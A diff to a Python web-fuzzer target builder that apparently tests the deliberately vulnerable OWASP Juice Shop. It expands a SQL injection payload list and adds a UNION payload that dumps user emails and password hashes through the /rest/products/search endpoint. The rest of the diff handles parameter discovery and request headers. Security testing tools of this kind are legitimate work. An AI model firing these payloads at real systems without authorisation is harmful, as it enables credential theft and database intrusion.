@@ -65,13 +65,26 @@ PAYLOADS = {
         "'\"><img src=x onerror=alert(1)>",
         "<script>alert(1)</script>",
     ],
+    # Include SQLite-friendly boolean payloads (with comment styles) up-front.
     "sqli": [
-        "' OR '1'='1",
-        "' OR '1'='2",
-        "\" OR \"1\"=\"1",
-        "\" OR \"1\"=\"2",
-        "';WAITFOR DELAY '0:0:3'--",
+        # string-context booleans
+        "' OR '1'='1--",
+        "' OR '1'='2--",
+        "' OR '1'='1'--",
+        "' OR '1'='2'--",
+        "' OR '1'='1' /*",
+        "' OR '1'='2' /*",
+        # unquoted/number-context variants
+        "1 OR 1=1--",
+        "1 OR 1=2--",
+        "' OR 1=1--",
+        "' OR 1=2--",
+        # parenthesis closer (common in filters)
+        "')) OR 1=1--",
+        "')) OR 1=2--",
+        # keep a couple of generic extras
         "' UNION SELECT NULL--",
+        "';WAITFOR DELAY '0:0:3'--",  # may no-op on SQLite; harmless
     ],
     # Expanded set of realistic allow-list bypass attempts
     "redir": [
@@ -173,9 +186,15 @@ def _payload_plan(param_name: str, method: str, content_type: Optional[str], pat
     # --- SQLi probes for identifiers/search
     if any(k in n for k in ["id", "uid", "user", "product", "item", "order", "sort", "orderby", "q", "query", "search", "s"]):
         plan += PAYLOADS["sqli"] + PAYLOADS["base"]
-        # Juice Shop UNION that you confirmed works (fast path)
-        if "/rest/products/search" in pth or n in ("q","query","search","s"):
-            plan += ["qwert')) UNION SELECT id, email, password, '4','5','6','7','8','9' FROM Users--"]
+        # Juice Shop: add known-good SQLite-friendly payloads for /rest/products/search
+        if "/rest/products/search" in pth or n in ("q", "query", "search", "s"):
+            plan += [
+                # booleans that visibly change result set
+                "' OR 1=1--",
+                "' OR 1=2--",
+                # UNION that matches the products query (10 columns; many NULLs)
+                "qwert')) UNION SELECT NULL,id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--",
+            ]
 
     # --- Login-ish fields (JSON or form)
     looks_like_login = ("login" in pth) or (n in {"email","username","user","login"})
@@ -227,6 +246,25 @@ def _merge_headers(h1: Optional[Dict[str, str]], h2: Optional[Dict[str, str]]) -
             out[k] = v
     return out
 
+def _augment_headers(h: Dict[str, str], url: str) -> Dict[str, str]:
+    """Add light, browser-ish defaults if missing for more stable responses."""
+    out = dict(h or {})
+    lower = {k.lower(): k for k in out.keys()}
+
+    def set_if_absent(k: str, v: str):
+        if k.lower() not in lower:
+            out[k] = v
+
+    set_if_absent("User-Agent", "Mozilla/5.0 (compatible; elise-target-builder/1.0)")
+    path = (urlparse(url).path or "").lower()
+    wants_json = ("/api/" in path) or ("/rest/" in path)
+    set_if_absent("Accept", "application/json, */*;q=0.8" if wants_json else "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+    u = urlparse(url)
+    if u.scheme and u.netloc:
+        set_if_absent("Referer", f"{u.scheme}://{u.netloc}/")
+    set_if_absent("Accept-Language", "en-US,en;q=0.8")
+    return out
+
 def _canonical_ctype(ctype: Optional[str], body_type: Optional[str]) -> Optional[str]:
     c = (ctype or "").lower().strip()
     if c:
@@ -240,6 +278,39 @@ def _canonical_ctype(ctype: Optional[str], body_type: Optional[str]) -> Optional
 
 def _dedupe_key(method: str, url: str, where: str, param: str, ctype: Optional[str]) -> Tuple[str, str, str, str, str]:
     return (method.upper(), url, where, param, (ctype or "").lower())
+
+def _unique(seq: List[str]) -> List[str]:
+    """Order-preserving dedupe."""
+    seen, out = set(), []
+    for x in seq:
+        if x and x not in seen:
+            seen.add(x); out.append(x)
+    return out
+
+def _infer_query_keys_from_url(url: str) -> List[str]:
+    try:
+        qs = parse_qs(urlparse(url).query, keep_blank_values=True)
+        return list(qs.keys())
+    except Exception:
+        return []
+
+def _infer_body_keys_from_templates(ep: Dict[str, Any], ctype: Optional[str]) -> List[str]:
+    # JSON body
+    if (ctype or "").startswith("application/json"):
+        tmpl = ep.get("body_template")
+        if isinstance(tmpl, dict):
+            return list(tmpl.keys())
+    # Form payloads
+    ft = ep.get("form_template")
+    if isinstance(ft, dict):
+        return list(ft.keys())
+    if isinstance(ft, list):
+        keys: List[str] = []
+        for item in ft:
+            if isinstance(item, dict) and item.get("name"):
+                keys.append(item["name"])
+        return keys
+    return []
 
 # =============================================================================
 # Core builder for fuzzer_core.run_fuzz
@@ -300,17 +371,50 @@ def build_targets(
 
         path = urlparse(url).path
         ctype = _canonical_ctype(ep.get("content_type"), ep.get("body_type"))
+
+        # Base param locations from crawler (may be empty)
         param_locs = ep.get("param_locs") or {
-            "query": ep.get("query_keys", []),
+            # ⚠️ include legacy fields too
+            "query": (ep.get("query_keys") or ep.get("params") or []),
             "body": ep.get("body_keys", []),
         }
 
-        # Filter params (drop tokens/empty)
-        q_params: List[str] = [p for p in (param_locs.get("query") or []) if p and not _is_token_param(p)]
-        b_params: List[str] = [p for p in (param_locs.get("body") or []) if p and not _is_token_param(p)]
+        # --- Assemble candidate query params (merge everything, keep order)
+        q_candidates: List[str] = []
+        # 1) canonical / crawler
+        if isinstance(param_locs.get("query"), list):
+            q_candidates += param_locs.get("query")  # type: ignore
+        # 2) legacy fields explicitly
+        if isinstance(ep.get("params"), list):
+            q_candidates += ep.get("params")  # type: ignore
+        if isinstance(ep.get("query_keys"), list):
+            q_candidates += ep.get("query_keys")  # type: ignore
+        # 3) URL inference (handles blanks like ?q=)
+        from_url = _infer_query_keys_from_url(url)
+        if from_url:
+            q_candidates += from_url
+        # 4) Last-ditch heuristic: obvious search endpoints
+        if not q_candidates:
+            low = (url or "").lower()
+            if "/search" in low and "?" in low:
+                q_candidates.append("q")
+        q_candidates = _unique(q_candidates)
+        q_params: List[str] = [p for p in q_candidates if p and not _is_token_param(p)]
 
+        # --- Assemble candidate body params (with template fallback)
+        b_candidates: List[str] = []
+        if isinstance(param_locs.get("body"), list):
+            b_candidates += param_locs.get("body")  # type: ignore
+        if isinstance(ep.get("body_keys"), list):
+            b_candidates += ep.get("body_keys")  # type: ignore
+        if not b_candidates:
+            b_candidates += _infer_body_keys_from_templates(ep, ctype)
+        b_candidates = _unique(b_candidates)
+        b_params: List[str] = [p for p in b_candidates if p and not _is_token_param(p)]
+
+        # If we truly have nothing actionable, skip
         if not q_params and not b_params:
-            continue  # nothing actionable
+            continue
 
         # Merge safe headers: start with captured headers (if any), then add auth cookie/bearer
         cap_headers = ep.get("headers") if isinstance(ep.get("headers"), dict) else {}
@@ -322,22 +426,37 @@ def build_targets(
             headers["Cookie"] = cookie_header
         # ensure our Authorization/Cookie override captured
         headers = _merge_headers(cap_headers, headers)
+        # add gentle browser-like defaults
+        headers = _augment_headers(headers, url)
 
         # Build baseline templates (prefer crawler-provided)
         form_template: Dict[str, str] = {}
         json_template: Dict[str, Any] = {}
 
         if ctype == "application/json":
+            # Prefer provided body_template; else synthesize from b_params
             src = ep.get("body_template") or {k: _baseline_value(k) for k in b_params}
             if isinstance(src, dict):
-                for k in b_params:
+                # include all keys from template OR discovered body params
+                keys = list({*list(src.keys()), *b_params})
+                for k in keys:
                     v = src.get(k)
                     json_template[k] = v if v is not None else _baseline_value(k)
         elif method in {"POST", "PUT", "PATCH"}:
             # assume x-www-form-urlencoded by default
-            keys = b_params or [i.get("name") for i in ep.get("form_template", []) if isinstance(i, dict) and i.get("name")]
-            for k in keys:
-                if not _is_token_param(k):
+            # Prefer provided form_template; else synthesize from b_params
+            ft = ep.get("form_template")
+            if isinstance(ft, dict):
+                for k, v in ft.items():
+                    if not _is_token_param(k):
+                        form_template[k] = v if v is not None else _baseline_value(k)
+            elif isinstance(ft, list):
+                for i in ft:
+                    if isinstance(i, dict) and i.get("name") and not _is_token_param(i["name"]):
+                        form_template[i["name"]] = _baseline_value(i["name"])
+            # fallback to discovered keys
+            for k in b_params:
+                if k not in form_template and not _is_token_param(k):
                     form_template[k] = _baseline_value(k)
 
         # === Per-parameter targets ===
